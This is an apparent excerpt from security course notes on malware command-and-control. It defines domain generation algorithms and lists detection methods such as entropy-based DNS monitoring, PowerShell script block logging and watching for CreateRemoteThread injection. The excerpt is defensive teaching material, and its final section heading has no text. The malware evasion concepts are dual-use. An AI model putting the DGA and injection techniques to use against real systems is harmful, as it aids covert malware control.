Detection: Script Block Logging (HKLM\ SOFTWARE\Policies\Microsoft\ PowerShell\ScriptBlockLogging); Constrained Language Mode; monitor for CreateRemoteThread cross-process injection.

docs.title: 20.8 C2 Communication Patterns
docs.text:
Definition 20.8 (Domain Generation Algorithm (DGA))

DGAs generate a large number of pseudo-random domain names using a seed (often the current date). The malware and attacker independently generate the same list; the attacker registers only a small subset. This prevents static blocklisting of C2 domains. Detection: DNS queries for high-entropy, algorithmically structured domains that resolve to a single IP; NX-domain query ratio.

docs.title: 20.8.1 C2 Protocol Analysis in Depth
docs.text:
